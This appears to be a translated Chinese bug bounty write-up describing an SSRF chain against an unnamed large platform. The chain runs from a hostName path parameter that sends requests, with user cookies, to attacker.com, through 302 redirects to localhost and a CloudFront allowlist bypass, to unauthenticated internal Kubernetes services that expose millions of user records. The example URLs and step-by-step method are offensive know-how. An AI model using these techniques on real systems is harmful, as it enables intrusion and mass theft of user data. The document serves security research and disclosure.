#  如何通过一个SSRF漏洞挖出百万用户数据   
原创 漏洞集萃  漏洞集萃   2025-05-29 07:39  
  
****  
今天给大家分享一个我最近在HackerOne上一个拥有超过8000万活跃用户的公开项目中挖到的“大宝贝”。  
  
这个故事有点曲折，充满了探索和惊喜，我把它分成了几个阶段，希望能带你沉浸式体验一把挖洞的乐趣。  
  
**第一幕：一个动态端点的“意外”馈赠**  
  
故事的开始，源于我对目标应用社交媒体分享模板功能的JavaScript代码审计。一段看似平平无奇的代码引起了我的注意：  
```

  WORKSPACE:"/api/client/workspaces/find/{hostName}",

```  
  
这个 {hostName}  
 占位符，像不像一个可以动态替换的入口？我心想，这多半是后端要根据这个 hostName  
 去做点什么。  
  
目标的API根路径是 https://target.com/social-media-name/  
。 于是，我随手构造了一个URL，把 hostName  
 设置成了目标自己的域名：https://target.com/social-media-name/api/client/workspaces/find/target.com  
  
返回了一些数据，看起来平平无奇。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sEia5pYe98AOohpqgziaCnaF3pE9nNaicjZSeRtvgONMqwzzibG4f0Jz1s8A/640?wx_fmt=other&from=appmsg "")  
  
**“要不，试试我自己的服务器？”**  
  
 这个念头一闪而过。 我立马把URL改成了：https://target.com/social-media-name/api/client/workspaces/find/attacker.com  
  
Bingo！我的服务器收到了请求！而且，我还能看到服务器的响应。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sE4EjLK2xf5Z3T36MrZEfzkZSQUDG7X6iaD3bsibsdiaOicMZ1wqZ6biaKhUw/640?wx_fmt=other&from=appmsg "")  
  
但真正让我心跳加速的，是请求里附带的东西——**用户的完整Cookie！**  
  
  
这意味着，如果受害者访问了我构造的链接，他们的Cookie就会原封不动地发到我的服务器上。这简直是账户接管的节奏啊！  
  
不过，先别急着激动，我们继续深挖。我发现，目标服务器向我服务器发起的请求，路径是固定的：https://attacker.com/api/v1/workspaces/find/  
。这说明后端的请求逻辑是拼接了这个固定路径的。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sED4Tian2RysbDIhN2lxohsdYt7bE6nLZq7CQy2SsvkYOBZa78bVPSZcQ/640?wx_fmt=other&from=appmsg "")  
  
**第二幕：内网的诱惑与HTTPS的“坚壁”**  
  
有了这个发现，我几乎可以代表服务器发送任意请求了。  
  
首当其冲的，自然是尝试访问内网IP，比如 127.0.0.1  
：https://target.com/social-media-name/api/client/workspaces/find/127.0.0.1  
  
结果，报错了：connect ECONNREFUSED 127.0.0.1:443  
  
这个错误信息，尤其是 ECONNREFUSED  
 和目标端口 443  
，让我联想到了Node.js里的Axios库。  
  
它似乎默认尝试用HTTPS（443端口）去连接。我又用了一个没有开放443端口的主机名测试，果然收到了SSL相关的错误：write EPROTO ... wrong version number ...  
  
看来，后端代码里，协议被写死成了 https://  
。我甚至模拟了一下后端的代码：  
```
ounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(lineounter(line
const axios = require("axios");
const HOST = "{hostName}"; // 这是我们能控制的
const sendRequest = async function () {
  try {
    const response = await axios({
      method: "get",
      baseURL: "https://" + HOST, // HTTPS写死
      url: `/api/v1/workspaces/find/${HOST}`,
    });
    console.log("Response Data: ", response.data);
  } catch (error) {
    console.error("Error: ", error.message);
  }
};

```  
  
HTTPS写死了，我还怎么去请求内网那些可能只跑在HTTP上的服务呢？****  
  
****  
**“对了，重定向！”**  
 Axios默认是跟随3xx跳转的。  
  
我在我的 attacker.com  
 服务器上的 /api/v1/workspaces/find/  
 路径设置了一个302跳转：  
  
https://attacker.com/api/v1/workspaces/find/  
 -> 302  
 -> http://test.com  
  
然后再次请求：https://target.com/social-media-name/api/client/workspaces/find/attacker.com  
  
成功了！我收到了 test.com  
 的内容！这意味着服务器跟随了我的重定向。   
  
那么，把 test.com  
 换成 http://localhost  
 呢？  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sE30uAPcyu40n3JmHE8xJckdt6k6GTrmYEktib7oMibVeHjIwhYUUMsibOw/640?wx_fmt=other&from=appmsg "")  
  
虽然直接访问 http://localhost  
 没返回内容，但我通过扫描常用端口，发现了两个活跃的服务：  
- http://localhost:3000  
 (就是当前这个社交媒体应用本身)  
  
- http://localhost:9090  
 (访问返回404)  
  
对 http://localhost:9090/FUZZ  
 进行目录爆破后，我找到了一个有趣的路径：http://localhost:9090/metrics  
。这通常是 **Prometheus**  
 监控系统暴露的指标数据接口，里面包含了大量的日志信息！这个发现，在后面帮了大忙。  
  
**第三幕：修复后的“反杀”——与白名单的斗智斗勇**  
  
在我报告漏洞后，开发团队很快进行了修复。现在，当我尝试用 attacker.com  
 时，直接返回404，我的服务器也收不到任何请求了。只有 target.com  
 能返回200。  
  
https://.../find/target.com  
 → 200  
  
https://.../find/attacker.com  
 → 404  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sEia5pYe98AOohpqgziaCnaF3pE9nNaicjZSeRtvgONMqwzzibG4f0Jz1s8A/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sEUUUHQzaeyYAETKxFTjYE5BOjFSDdDjicKZKCsyFAicCS2SrLfvZrRZrA/640?wx_fmt=other&from=appmsg "")  
  
看起来是加了某种验证。我开始测试子域名，发现一个奇怪现象：  
  
https://.../find/sub1.target.com  
 → 404  
  
https://.../find/sub2.target.com  
 → 404  
  
https://.../find/sub3.target.com  
 → 200 (能显示内容！)  
  
为什么有的子域名行，有的不行？  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sElTtrIdfDftjZwwIzB2AQtibmibT1VpW0BuuGvnMicrBZqQYvibLKMjJxTw/640?wx_fmt=other&from=appmsg "")  
  
我直接请求这些子域名上的   
  
https://subX.target.com/api/v1/workspaces/find/  
 路径，发现：  
  
https://sub1.target.com/.../find/  
 → 404  
  
https://sub2.target.com/.../find/  
 → 504  
  
https://sub3.target.com/.../find/  
 → 200 (即使路径不存在，它也返回200)  
  
我明白了！新的逻辑是：  
1. 检查你提供的 hostName  
 是否“合法”（可能是一个白名单）。  
  
1. 如果合法，服务器会向 https://hostName/api/v1/workspaces/find/  
 发送请求。  
  
1. 如果这个内部请求返回 2xx  
 状态码，就把响应展示给我；否则，就给我返回一个不带响应体的404。  
  
也就是说，我不仅需要 hostName  
 在白名单里，还需要这个 hostName  
 对应的 /api/v1/workspaces/find/  
 路径能返回 2xx  
。  
  
我把我之前收集到的目标公司旗下的其他域名也试了一遍，果然，大部分返回404，但有一个完全不同的域名 secondary-domain.com  
 居然返回了200！  
  
https://.../find/secondary-domain.com  
 → 200  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sEslIgUnj9Pfm69tvpXSd98BSGMCyjxvWE9Nh7OiaQVuFbib71t1MTx19g/640?wx_fmt=other&from=appmsg "")  
  
**我几乎可以肯定，他们在用一个域名白名单！**  
  
****  
现在的问题是，如果白名单里的域名都是他们自己的，我该怎么办？两个思路：  
1. 找个白名单里的域名，看有没有子域名接管漏洞。  
  
1. 找个白名单里的域名，我可以在它的子域名上部署我自己的服务。  
  
我注意到，每次服务器响应时，都有一个 X-Envoy-Upstream-Service-Time  
 的HTTP头，它表示上游主机处理请求的时间。   
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sElRC29CWfEeuV6STJicHFb3YZrBvvy7NGCtLbj7TddKko1gJgu5r52BQ/640?wx_fmt=other&from=appmsg "")  
  
灵机一动：如果域名无效，服务器根本不会发送请求，处理时间应该很短；如果域名有效并发送了请求，时间就会长一些。**这不就是时间盲注的思路吗！**  
  
****  
我写了个脚本测试：  
- 完全无效域名 (如 attacker.com  
)：耗时 7-16ms  
  
- 有效域名的无效子域名 (如 noip.target.com  
)：耗时 10-20ms  
  
- 有效域名但内部请求非2xx (如 sub1.target.com  
)：耗时 >20ms  
  
- 有效域名且内部请求200 (如 target.com  
)：耗时 >500ms  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sE6LK9gWoTyicJy5RdgYibibVmEF6BiacxlBMDMZv64y3GLfMZQ6gqTicDe2A/640?wx_fmt=other&from=appmsg "")  
  
这个差异很明显！如果 hostName  
 无效，sendRequest  
 函数根本不执行，时间自然短。  
  
有了这个利器，我开始寻找“既在白名单内，我又能在其子域名上部署服务”的域名。   
  
我收集了目标所有相关域名的所有子域名，筛选出CNAME记录，提取目标值，得到了一堆类似这样的域名：target-community.insided.comxxxxx.cloudfront.nettarget.github.io  
...  
  
然后用我的时间盲注脚本去探测这些域名。大部分都无效，但是……***.cloudfront.net 完全有效！平均上游响应时间超过了20ms！**  
  
****  
Amazon CloudFront！CDN服务！用户可以创建自己的CloudFront分发，指向自己的源服务器！   
  
我立刻创建了一个CloudFront分发 xxxattackerxxx.cloudfront.net  
，让它指向我的 attacker.com  
。  
  
 然后，构造终极请求：https://target.com/social-media-name/api/client/workspaces/find/xxxattackerxxx.cloudfront.net  
  
**成了！我的服务器再次收到了请求！**  
 我又可以愉快地在我的服务器上配置302重定向，指向内网IP了！漏洞完美复现！  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sEkgRMwmhJWWb9obJ9DLwowFxsYxSOMjWufsnZa2U5AW02Xg26xicia3Jw/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sERvpEYjnkj5rbYCBIFhU5G8WWG3PGqRxk3PYfleIl7lR76ibgEdf1GIA/640?wx_fmt=other&from=appmsg "")  
  
**第四幕：深潜入渊——内网漫游与数据的“宝藏”**  
  
重新拿到SSRF权限后，我开始探索内网。 首先尝试了AWS的实例元数据服务 http://169.254.169.254/latest/user-data  
。  
  
应用返回404，但查看 localhost:9090/metrics  
 日志发现，实际状态码是 **401 Unauthorized**  
。 原来是 **IMDSv2**  
 在起作用！AWS为了防止SSRF泄露敏感信息，增强了安全机制，需要特定的会话令牌才能访问。这条路暂时走不通。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLesnx9McM977y5gHF2h8sEtlu8ysAYoiaibVG7tjePqAuaqA7krica8ZSj9uhAJrjiacb6KdjwC18PVw/640?wx_fmt=other&from=appmsg "")  
  
不过，/metrics  
 日志再次立功！我注意到一个请求被发送到了 172.31.49.66  
，还看到了类似 xxx.xxx.svc.cluster.local  
 的域名结构——这表明内部使用了 **Kubernetes (K8s)**  
！  
  
我的策略是：  
1. HTTP扫描 172.31.0.0/16  
 网段的常见端口。  
  
1. 对 xxx.xxx.svc.cluster.local  
 进行DNS爆破。  
  
同时，我想到了一个更聪明的办法：****  
  
**解析目标所有子域名的IP，筛选出其中的内网IP！**  
  
果然，我找到了一些指向 172.31.0.0/16  
 网段的内部服务域名：  
  
internal-service1.target.com  
 → 172.31.11.190  
 (Nexus代理)  
  
internal-service2.target.com  
 → 172.31.29.14  
 (Vminsert)  
  
internal-service3.target.com  
 → 172.31.12.20  
 (Pushgateway)  
  
internal-service4.target.com  
 → 172.31.55.203  
 (Alert manager)  
  
 ...  
  
在 internal-service3.target.com  
 上，我发现了好几个K8s的命名空间和服务名，这让我可以更精确地生成内部K8s域名进行测试。  
  
最终，当我请求 http://internal-service.target.com:80  
时，收到了 It's alive!  
 的响应。有戏！ 开始对它进行路径Fuzz：http://internal-service.target.com:80/FUZZ  
  
然后，一个路径出现了：http://internal-service.target.com:80/applications  
访问这个路径，返回了**海量的用户数据！**  
  
****  
有趣的是，主应用里也有个类似的端点 https://target.com:80/api/v1/profile/applications  
，但它有严格的授权检查，只返回当前登录用户的数据。而这个内网的 http://internal-service.target.com:80/applications**完全没有授权机制！**  
我可以直接访问所有用户的数据，甚至通过 http://internal-service.target.com:80/applications/<ID>  
 访问单个用户数据。  
  
至此，我获得了**数百万用户的敏感信息**  
。同时，我之前跑的自动化扫描脚本也陆续发现了更多内网地址，上面运行着各种管理面板、敏感日志文件和监控面板。  
  
  
**思考与启发：**  
- **不要放过任何细节：**  
 一个小小的 {hostName}  
，一个特殊的HTTP响应头，都可能成为突破口。  
  
- **理解应用行为：**  
 模拟后端代码，理解错误信息，是深入分析漏洞的关键。  
  
- **日志是金矿：**/metrics  
 接口多次为作者指明了方向。  
  
- **修复可能不完美：**  
 对修复方案进行深入测试，往往能找到绕过方法。  
  
- **知识储备很重要：**  
 对Axios特性、HTTP重定向、CloudFront、AWS IMDS、Kubernetes等知识的了解，是成功的基石。  
  
- **创造性思维：**  
 利用响应时间差异判断白名单，解析外部域名获取内部IP，都是非常巧妙的思路。  
  
  
  
====本文结束====  
  
以上内容由漏洞集萃翻译整理。  
  
参考：  
  
https://medium.com/@skycer_00/full-blown-ssrf-to-gain-access-to-millions-of-users-records-and-multiple-internal-panels-3719d9b802e9  
  
  
